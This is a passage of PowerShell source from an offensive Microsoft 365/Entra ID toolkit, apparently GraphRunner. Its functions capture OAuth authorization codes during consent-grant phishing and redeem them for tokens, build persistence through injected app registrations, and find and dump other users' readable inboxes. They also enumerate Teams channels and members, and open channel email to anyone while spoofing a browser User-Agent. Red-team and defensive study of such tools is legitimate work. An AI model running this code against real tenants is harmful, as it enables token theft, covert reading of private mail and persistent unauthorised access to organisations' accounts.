            $err = $_.Exception
            $err
        }
        $out = $request.Content | ConvertFrom-Json
        $out.data.t
}
function Invoke-DeleteOAuthApp{
    <#
     .SYNOPSIS
        Simple module to delete an app registration. Use the Object ID (Output at the end of Invoke-InjectOAuthApp) not the app ID.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Simple module to delete an app registration. Use the Object ID (Output at the end of Invoke-InjectOAuthApp) not the app ID.

    .PARAMETER Tokens

        Provide an already authenticated access token. 

    .PARAMETER ObjectID

        The Object ID of the app registration you want to delete.
    
    .EXAMPLE
        
        C:\PS> Invoke-DeleteOAuthApp -Tokens $tokens -ObjectID <object ID of app>
        Description
        -----------
        This command will delete the specified app registration from the tenant.

    #>

    param(
        [Parameter(Position = 0, Mandatory = $True)]
        [object[]]
        $Tokens = "",
        [Parameter(Position = 0, Mandatory = $True)]
        [string]
        $ObjectID = ""
    )
    $accessToken = $tokens.access_token
    $deleteUrl = "https://graph.microsoft.com/v1.0/applications/$ObjectID"
    $headers = @{
        Authorization = "Bearer $accessToken"
    }


    $response = Invoke-RestMethod -Uri $deleteUrl -Headers $headers -Method Delete

    if ($response -ne $null) {
        Write-Output "App registration with ID $ObjectId deleted successfully."
    } else {
        Write-Error "Error deleting app registration."
    }

}

Function Invoke-GraphOpenInboxFinder{
    <#
    .SYNOPSIS

        A module that can be used to find inboxes of other users in a tenant that are readable by the current user. This oftentimes happens when a user has misconfigured their mailbox to allow others to read mail items within it. NOTE: You must have Mail.Read.Shared or Mail.ReadWrite.Shared permissions to read other mailboxes with the Graph.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       A module that can be used to find inboxes of other users in a tenant that are readable by the current user. This oftentimes happens when a user has misconfigured their mailbox to allow others to read mail items within it. NOTE: You must have Mail.Read.Shared or Mail.ReadWrite.Shared permissions to read other mailboxes with the Graph.

    .PARAMETER Tokens

        Provide an already authenticated access token. 

    .PARAMETER UserList

        Userlist of users to check (one per line)
    
    .EXAMPLE
        
        C:\PS> Invoke-GraphOpenInboxFinder -Tokens $tokens -UserList userlist.txt
        Description
        -----------
        Using this module will attempt to access each inbox in the userlist file as the current user. 

    #>

    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userlist = ""
    )

    if($tokens){
        $access_token = $tokens.access_token
    }
    else{
        Write-Host -ForegroundColor yellow "[*] No tokens detected. Pass your authenticated tokens to this module with the -Tokens option. "
        return
    }
    
    $Mailboxes = @(Get-Content -Path $userlist)
    
    if (!$Mailboxes){return}

    $count = $Mailboxes.count
    $curr_mbx = 0
    Write-Host -ForegroundColor yellow "[*] Note: To read other user's mailboxes your token needs to be scoped to the Mail.Read.Shared or Mail.ReadWrite.Shared permissions."   

    Write-Output "`n`r"
    Write-Output "[*] Checking access to mailboxes for each email address..."
    Write-Output "`n`r"
    foreach($mbx in $Mailboxes)
    {
        $request = ""
        Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r"
        $curr_mbx += 1
        try { $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
        }catch{
            $err = $_.Exception.Response.StatusCode.Value__
        }
    
        If ($request.StatusCode -eq 200){
            Write-Host -ForegroundColor Green "[*] SUCCESS! Inbox of $mbx is readable."
            $out = $request.Content | ConvertFrom-Json
            Write-Host ("Latest Email Received " + $out.value.createdDateTime + " with subject: " + $out.value.subject)
        }
    }
}



Function Get-AzureAppTokens{
    <#
        .SYNOPSIS

        This module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.

    .PARAMETER ClientId

        The Client ID (AppID) of the App

    .PARAMETER ClientSecret

        The secret of the app
    
    .PARAMETER RedirectUri

        The Redirect URI used in the authorization request
    
    .PARAMETER Scope

        Permission scope of the app "Mail.Read openid etc"
    
    .PARAMETER AuthCode

        The authorization code retrieved from the request sent to the redirect URI during the OAuth flow

    .EXAMPLE
        
        C:\PS> Get-AzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -AuthCode "0.AUYAME_74EXAMPLEUZSUBZqrWXZOtU7Jh4..."
        -----------
        This will authenticate as an app registration (service principal) while completing an OAuth flow using the AuthCode provided. This would be useful in a situation where you have harvested an OAuth code during a consent grant flow.
    
    #>

    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $Scope = "",

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $ClientID = "",

        [Parameter(Position = 2, Mandatory = $true)]
        [string]
        $ClientSecret = "",

        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $RedirectUri = "",

        [Parameter(Position = 4, Mandatory = $true)]
        [string]
        $AuthCode = ""
    )

    $body = @{client_id=$ClientID
    scope=$Scope
    code=$AuthCode
    redirect_uri=$RedirectUri
    grant_type="authorization_code"
    client_secret=$ClientSecret
    }

    try{
    $request = Invoke-WebRequest -UseBasicParsing -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    $continue = $details.error -eq "authorization_pending"
    Write-Output $details.error
    }
    if($request)
        {
            try{
                $global:apptokens = $request.Content | ConvertFrom-Json
            }
            catch{
                $details=$_.ErrorDetails.Message | ConvertFrom-Json
                Write-Output $details.error
                return
            }
            Write-Output "---Here is your access token---"
            $apptokens.access_token
            Write-Output "---Here is your refresh token---"
            $apptokens.refresh_token
            Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $apptokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $apptokens)'
            Write-Host -ForegroundColor Green '[*] You can use this command to refresh your tokens:'
            Write-Host -ForegroundColor Cyan ('Invoke-RefreshAzureAppTokens -ClientId "' + $ClientId + '" -ClientSecret "' + $ClientSecret + '" -RedirectUri "' + $RedirectUri + '" -scope "' + $Scope + '" -RefreshToken "' + $apptokens.refresh_token + '"' )
        }
}

Function Invoke-CheckAccess{
    <#
        .SYNOPSIS 
            
            A simple module for checking Graph access.

    #>

    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = ""
    )
    $access_token = $tokens.access_token
    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
    $out = $request.Content | ConvertFrom-Json
    $out
}

Function Get-UserObjectID{
    <#
        .SYNOPSIS 
            
            A simple module to retrieve a user's object ID.

    #>

    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $upn = ""
    )
    $access_token = $tokens.access_token
    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$upn" -Headers @{"Authorization" = "Bearer $access_token"}
    $out = $request.Content | ConvertFrom-Json
    $out.id
}
Function Invoke-RefreshAzureAppTokens{
    <#
     .SYNOPSIS

        This module refreshes an Azure App token.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module refreshes an Azure App token.

    .PARAMETER ClientId

        The Client ID (AppID) of the App

    .PARAMETER ClientSecret

        The secret of the app
    
    .PARAMETER RedirectUri

        The Redirect URI used in the authorization request
    
    .PARAMETER Scope

        Permission scope of the app "Mail.Read openid etc"
    
    .PARAMETER RefreshToken

        A refresh token associated with the app

    .EXAMPLE
        
        C:\PS> Invoke-RefreshAzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -RefreshToken "0.AUYAME_75cEXAMPLEUBZqrWd22WdOz..."
        -----------
        This will refresh your Azure app tokens.

    #>

    
Param
(
    [Parameter(Position = 0, Mandatory = $false)]
    [string]
    $Scope = "openid offline_access email user.read profile",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $RefreshToken = ""
)

    $body = @{client_id=$ClientID
    scope=$Scope
    refresh_token=$RefreshToken
    redirect_uri=$RedirectUri
    grant_type="refresh_token"
    client_secret=$ClientSecret
    }

    $request = Invoke-WebRequest -UseBasicParsing -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
    $global:apptokens = $request.Content | ConvertFrom-Json
    Write-Output "---Here is your access token---"
    $apptokens.access_token
    Write-Output "---Here is your refresh token---"
    $apptokens.refresh_token
    Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $apptokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $apptokens)'
}


Function Invoke-AutoOAuthFlow{
    <#
        .SYNOPSIS

        Whenever a user consents to an OAuth app their browser sends a request to a specified redirect URI to provide an authorization code. In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in this repo to capture the code. If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost. This modules stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Whenever a user consents to an OAuth app their browser sends a request to a specified redirect URI to provide an authorization code. In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in this repo to capture the code. If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost. This modules stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials.

    .PARAMETER ClientId

        The Client ID (AppID) of the App

    .PARAMETER ClientSecret

        The secret of the app
    
    .PARAMETER RedirectUri

        The Redirect URI used in the authorization request
    
    .PARAMETER Scope

        Permission scope of the app "Mail.Read openid etc"
    
    .EXAMPLE
        
        C:\PS> Invoke-AutoOAuthFlow -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "http://localhost:10000" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read"
        -----------
        This will spin up a webserver on your localhost port 10000 to catch the auth code during consent grant.

    #>
    Param
    (
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Scope = "",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = ""
    )
    
    Add-Type -AssemblyName System.Web

    $uri = [System.Uri]$RedirectUri

    if ($uri.Port -eq -1) {
        # Port is not specified in the RedirectUri
        $port = if ($uri.Scheme -eq "https") { 443 } else { 80 }
    } else {
        $port = $uri.Port
    }

    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$port/")
    $listener.Start()

    Write-Host "Listening for incoming requests on http://localhost:$port/"

    $oauthcodes  = @()
    while ($true) {
        $context = $listener.GetContext() # This blocks until a request is received
        $request = $context.Request
        $response = $context.Response

        # Capture the OAuth code from the query parameters
        $queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
        $oauthCode = $queryParams["code"]
            
        Write-Host "Captured OAuth code: $oauthCode"

        # Respond to the client
        $responseText = "OAuth code captured successfully."
        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
        $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
        $response.Close()
            
        if($oauthCode -notin $oauthcodes){
        Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
        }
        else{
            Write-Host "[*] Skipping OAuth code we've already seen..."
        }
        $oauthcodes += $oauthCode

    }

}

Function Get-Inbox{
    <#
    .SYNOPSIS

        This module will pull the latest emails from the inbox of a particular user. NOTE: This is the module you want to use if you are reading mail from a shared mailbox.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module will pull the latest emails from the inbox of a particular user. NOTE: This is the module you want to use if you are reading mail from a shared mailbox.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER userId

        Email address of the mailbox you want to read
    
    .PARAMETER TotalMessages

        Default is 25, Max is 1000
    
    .PARAMETER OutFile

        File to output the results to
    
    .EXAMPLE
        
        C:\PS> Get-Inbox -Tokens $tokens -userid deckard@tyrellcorporation.io -TotalMessages 50 -OutFile emails.csv
        -----------
        This will connect to the specified userid's inbox and pull the latest 50 messages. 

    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $userid = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $TotalMessages = "25",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $OutFile = ""
    )
    if($Tokens){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."   
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 

    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
    $out = $request.Content | ConvertFrom-Json
    $resultsList = @()
    foreach ($hit in $out.value) {
            $subject = $hit.subject
            $sender = $hit.sender.emailAddress.address
            $receivers = $hit.toRecipients.emailAddres.address
            $date = $hit.sentDateTime
            $preview = $hit.bodyPreview
            $body = $hit.body.content

            $LogInfo = @{
                        "Subject" = $subject
                        "Sender" = $sender
                        "Receivers" = $receivers
                        "Date" = $date
                        "Body" = $body
                    }
    
            $resultsList += New-Object PSObject -Property $LogInfo
            Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
            Write-Output ("=" * 80) 
            }
    if($OutFile){
        Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
        $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
    }
}

function Get-TeamsApps{
    <#
    .SYNOPSIS

        This module enumerates all accessible Teams chat channel and grabs the URLs for all installed apps in side each channel.
        Author: Matt Eidelberg (@Tyl0us)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
    This module enumerates all accessible Teams chat channel and grabs the URLs for all installed apps in side each channel.     

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter
  
    .EXAMPLE
        
        C:\PS> Get-TeamsApps -Tokens $tokens 
        -----------
        This will enumerates all accessible Teams chat channel and grabs the URLs for all installed apps in side each channel. 

    #>
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens
        )
        if(!$Tokens){
            if ($global:tokens){
                $tokens = $global:tokens   
            } else {
                # Login
                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
                Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                while($auth -notlike "Yes"){
                    Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                    $answer = Read-Host 
                    $answer = $answer.ToLower()
                    if ($answer -eq "yes" -or $answer -eq "y") {
                        Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                        $tokens = Get-GraphTokens -ExternalCall
                        $auth = "Yes"
                    } elseif ($answer -eq "no" -or $answer -eq "n") {
                        Write-Host -ForegroundColor Yellow "[*] Quitting..."
                        return
                    } else {
                        Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                    }
                }
            }
        }    
    $access_token = $tokens.access_token   
    $headers = @{
        Authorization = "Bearer $access_token"
        "Content-Type" = "application/json"
    }

    $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $headers

    foreach ($team in $teamsResponse.value) {
        $teamId = $team.id
        Write-Host "Team: $($team.displayName)"

        $channelsResponse = Invoke-RestMethod -Headers $headers -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop

        foreach ($channel in $channelsResponse.value) {
            $channelId = $channel.id
            Write-Host "  Checking Channel: $($channel.displayName)"

            try {
                $connectorsResponse = Invoke-RestMethod -Headers $headers -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels/$channelId/tabs" -Method Get -ErrorAction Stop
                foreach ($tab in $connectorsResponse.value) {
                    if ($tab -and $tab.webUrl) {
                        Write-Host "    Channel App: $($tab.displayName) - URL: $($tab.webUrl)"
                    }
                }
            } catch {
                Write-Host "    An error occurred: $_.Exception.Message"
            }
        }
    }
}


function Get-TeamsChannels{
    <#
    .SYNOPSIS
        This module enumerates all accessible teams and the channels a user has access to. 
        Author: Matt Eidelberg (@Tyl0us)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module enumerates all accessible teams and their channels a user has access to. 


    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter
  
    .EXAMPLE
        
        C:\PS> Get-TeamsChannels -Tokens $tokens
        -----------
        This module enumerates all accessible teams and their channels a user has access to. 

    #>
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens
        )
        if(!$Tokens){
            if ($global:tokens){
                $tokens = $global:tokens   
            } else {
                # Login
                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
                Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                while($auth -notlike "Yes"){
                    Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                    $answer = Read-Host 
                    $answer = $answer.ToLower()
                    if ($answer -eq "yes" -or $answer -eq "y") {
                        Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                        $tokens = Get-GraphTokens -ExternalCall
                        $auth = "Yes"
                    } elseif ($answer -eq "no" -or $answer -eq "n") {
                        Write-Host -ForegroundColor Yellow "[*] Quitting..."
                        return
                    } else {
                        Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                    }
                }
            }
        }
          
    $accesstoken = $tokens.access_token   
    [string]$refreshtoken = $tokens.refresh_token 

    $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
    $grantType = "refresh_token"

    $access_token = $tokens.access_token   
    $teamsheaders = @{
        Authorization  = "Bearer $access_token"
        "Content-Type" = "application/json"
    }
    $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $teamsheaders
    foreach ($team in $teamsResponse.value) {
            $teamId = $team.id
            $teamName = $team.displayName
            Write-Host "Team Name: $($teamName)"
            $channelsResponse = Invoke-RestMethod -Headers $teamsheaders -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop
            foreach ($channel in $channelsResponse.value) {
                    $channelDesc = $channel.Description
                    $channelName = $channel.displayName
                    Write-Host "    Channel Name: $($channelName)"
                    if ($channel.Description -and $channel.Description.Trim() -ne "") {
                        Write-Host "    Channel Description: $($channelDesc)"
                    }
                }
        }
}
function Get-ChannelUsersEnum{
    <#
    .SYNOPSIS
        This module enumerates a defined channel to see how many people are in a channel and who they are.
        Author: Matt Eidelberg (@Tyl0us)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module enumerates a defined channel to see how many people are in a channel and who they are.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER Channel

        The channel name to enumerate 
  
    .PARAMETER Teams

        The team name that the channel resides in 

    .EXAMPLE
        
        C:\PS> Get-ChannelUsersEnum -Tokens $tokens -Channel "ChannelName" -Teams "TeamName"
        -----------
        This module enumerates a defined channel to see how many people are in a channel and who they are.

    #>
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $Channel = "",
        [Parameter(Position = 2, Mandatory = $False)]
        [string]
        $Teams = ""
        )
        if(!$Tokens){
            if ($global:tokens){
                $tokens = $global:tokens   
            } else {
                # Login
                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
                Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                while($auth -notlike "Yes"){
                    Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                    $answer = Read-Host 
                    $answer = $answer.ToLower()
                    if ($answer -eq "yes" -or $answer -eq "y") {
                        Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                        $tokens = Get-GraphTokens -ExternalCall
                        $auth = "Yes"
                    } elseif ($answer -eq "no" -or $answer -eq "n") {
                        Write-Host -ForegroundColor Yellow "[*] Quitting..."
                        return
                    } else {
                        Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                    }
                }
            }
        }    
        $accesstoken = $tokens.access_token
        $channelString = $Channel
        [string]$refreshtoken = $tokens.refresh_token 

        $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
        $grantType = "refresh_token"


        ### addded logic to loop through all teams, to get the teams ID and then the channels and their IDs
        $access_token = $tokens.access_token   
        $teamsheaders = @{
            Authorization  = "Bearer $access_token"
            "Content-Type" = "application/json"
            "User-Agent"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
        }
        $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $teamsheaders
        $channelFound = $false

        foreach ($team in $teamsResponse.value) {
            $teamId = $team.id
            $teamName = $team.displayName
            if (-not $Teams -or $teamName -eq $Teams) {
                $channelsResponse = Invoke-RestMethod -Headers $teamsheaders -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop
                foreach ($channelinfo in $channelsResponse.value) {
                    if ($channelinfo.displayName -eq $Channel) {
                        Write-Host "Team Name: $teamName"
                        $channelId = $channelinfo.id
                        $channelDesc = $channelinfo.Description
                        $channelName = $channelinfo.displayName
                        Write-Host "Channel Name: $($channelName)"
                        Write-Host "Channel Description: $($channelDesc)"
                        Write-Host "Channel ID: $($channelId)"
                        $channelFound = $true
                        break
                    }
                }
                if ($channelFound) {
                    break 
                } elseif (-not $Teams) {
                    continue
                } else {
                    Write-Host -ForegroundColor Red "Error: Channel '$Channel' not found in team '$Teams'. Please ensure the channel name is correct."
                    break
                }
            }
        }
        if (-not $channelId) {
            Write-Host -ForegroundColor Red "Error Channel Not found..."
            Write-Host -ForegroundColor Red "Please ensure the channel name is correct"
            return
        }

        $channelResponse2 = Invoke-RestMethod "https://graph.microsoft.com/beta/teams/$teamId/channels/$channelId/members" -Method GET -headers $teamsheaders

        Write-Host -ForegroundColor Yellow  "Number of people in the Channel: $($channelResponse2.'@odata.count')"

        foreach ($channelinfo in $channelResponse2.value) {
            Write-Host "User: $($channelinfo.displayName)"
            Write-Host "    Email Address: $($channelinfo.email)"
            if ($($channelinfo.roles) -eq "owner") {
                Write-Host -ForegroundColor Yellow "    Channel Role: $($channelinfo.roles)"
            }
        }
}

function Get-ChannelEmail{
    <#
    .SYNOPSIS
        This module enumerates a defined channel for an email address and sets the sender type to Anyone. If there is no email address, it then creates one and sets the sender type to Anyone.
	Author: Matt Eidelberg (@Tyl0us)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module enumerates a defined channel for an email address and sets the sender type to Anyone. If there is no email address, it then creates one and sets the sender type to Anyone.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER Channel

        The channel name to set or create the email address for
  
    .PARAMETER Teams

        The team name that the channel resides in 

    .EXAMPLE
        
        C:\PS> Get-ChannelEmail -Tokens $tokens -Channel "ChannelName" -Teams "TeamName"
        -----------
        This module enumerates a defined channel for an email address and sets the sender type to Anyone. If there is no email address, it then creates one and sets the sender type to Anyone.

    #>
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $Channel = "",
        [Parameter(Position = 2, Mandatory = $False)]
        [string]
        $Teams = ""
        )
        if(!$Tokens){
            if ($global:tokens){
                $tokens = $global:tokens   
            } else {
                # Login
                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
                Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                while($auth -notlike "Yes"){
                    Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                    $answer = Read-Host 
                    $answer = $answer.ToLower()
                    if ($answer -eq "yes" -or $answer -eq "y") {
                        Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                        $tokens = Get-GraphTokens -ExternalCall
                        $auth = "Yes"
                    } elseif ($answer -eq "no" -or $answer -eq "n") {
                        Write-Host -ForegroundColor Yellow "[*] Quitting..."
                        return
                    } else {
                        Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                    }
                }
            }
        }    
        $accesstoken = $tokens.access_token   
        [string]$refreshtoken = $tokens.refresh_token 

        $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
        $grantType = "refresh_token"

        $body = @{
            client_id           = $clientId
            scope               = $scope
            grant_type          = $grantType
            refresh_token       = $refreshToken
            client_info         = 1
            "client-request-id" = (New-Guid).ToString()
        }
        $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
        $token2 = $response.access_token

        $scope2 = "https://api.spaces.skype.com/.default openid profile offline_access"
        $grantType = "refresh_token"

        $body = @{
            client_id           = $clientId
            scope               = $scope2
            grant_type          = $grantType
            refresh_token       = $refreshToken
            client_info         = 1
            "client-request-id" = (New-Guid).ToString()
        }
        $response2 = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
        $SStoken = $response2.access_token

        $headers = @{
            "Host"             = "outlook.office.com"
            "Cache-Control"    = "no-cache"
            "Pragma"           = "no-cache"
            "Sec-Ch-Ua-Mobile" = "?0"
            "Authorization"    = "Bearer $token2"
            "Sstoken"          = "$SStoken"
            "User-Agent"       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
        }

        $response3 = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/Manage/AuthorizeUsingToken?client=SkypeSpaces" -Method Get -SessionVariable WebSession -headers $headers
        $url = 'https://outlook.office.com'
        $WebSession.Headers.Clear()

        $access_token = $tokens.access_token   
        $teamsheaders = @{
            Authorization  = "Bearer $access_token"
            "Content-Type" = "application/json"
        }

        $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $teamsheaders
        $channelFound = $false

        foreach ($team in $teamsResponse.value) {
            $teamId = $team.id
            $teamName = $team.displayName
            if (-not $Teams -or $teamName -eq $Teams) {
                $channelsResponse = Invoke-RestMethod -Headers $teamsheaders -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop
                foreach ($channelinfo in $channelsResponse.value) {
                    if ($channelinfo.displayName -eq $Channel) {
                        $channelId = $channelinfo.id
                        $channelName = $channelinfo.displayName
                        Write-Host "Team Name: $teamName"
                        Write-Host "Channel Name: $($channelName)"
                        $channelFound = $true
                        break 
                    }
                }
                if ($channelFound) {
                    break 
